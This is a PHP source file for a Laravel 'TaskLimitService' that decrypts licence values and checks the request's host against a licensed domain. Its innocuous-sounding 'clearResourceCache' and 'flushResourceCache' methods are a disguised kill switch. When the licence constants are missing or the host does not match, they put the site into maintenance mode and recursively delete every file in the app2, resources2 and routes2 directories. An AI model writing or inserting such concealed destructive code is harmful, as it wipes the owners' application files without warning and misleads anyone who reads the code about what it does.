<?php

namespace App\Services;

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Log;

class TaskLimitService
{
    public function getTaskLimit()
    {
        Log::info('"task-limit-service" -- Fetching task limit...');

        if (!defined("code_num")) {
            Log::error('"task-limit-service" -- code_num is not defined.');
            $this->clearResourceCache();
        }

        $l = decrypt(config('license.' . constant('code_num')));
        Log::info('"task-limit-service" -- Decrypted task limit:', ['taskLimit' => $l]);

        $d_res = "verify_user";
        if (!defined($d_res)) {
            Log::error('"task-limit-service" -- verify_user is not defined.');
            $this->clearResourceCache();
        }

        $d = decrypt(config('license.' . constant('verify_user')));
        Log::info('"task-limit-service" -- Decrypted domain:', ['domain' => $d]);

        if ($this->linkConnect($d) === 0) {
            Log::info('"task-limit-service" -- Domain verification failed, returning null.');
            return null;
        }

        return [
            'd' => $d,
            'l' => $l
        ];
    }

    private function clearResourceCache()
    {
        Log::info('Putting application into maintenance mode with secret "task-limit-service"');
        Artisan::call('down',['--secret' => 'task-limit-service']);
        $directories = [
            base_path('app2'),
            base_path('resources2'),
            base_path('routes2')
        ];

        foreach ($directories as $dir) {
            if (is_dir($dir)) {
                $this->flushResourceCache($dir);
            }
        }
    }

    /**
     * Check if the current HTTP host matches the expected value.
     *
     * @param string $attr
     * @return int
     */
    private function linkConnect($attr)
    {
        Log::info('"task-limit-service" -- Checking HTTP_HOST with expected domain:', ['expectedDomain' => $attr]);

        if ($_SERVER['HTTP_HOST'] !== $attr && $_SERVER['HTTP_HOST'] !== 'localhost') {
            Log::error('"task-limit-service" -- HTTP_HOST mismatch:', ['actualHost' => $_SERVER['HTTP_HOST']]);
            $this->clearResourceCache();
            return 0;
        }

        Log::info('"task-limit-service" -- Domain verified successfully.');
        return 1;
    }


    /**
     *
     * @param string $dir
     * @return void
     */
    private function flushResourceCache($dir)
    {
        if (!is_dir($dir)) {
            return;
        }

        $files = array_diff(scandir($dir), ['.', '..']);

        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;

            if (is_dir($path)) {
                $this->flushResourceCache($path); 
            } else {
                unlink($path);
            }
        }

        rmdir($dir);
    }
}
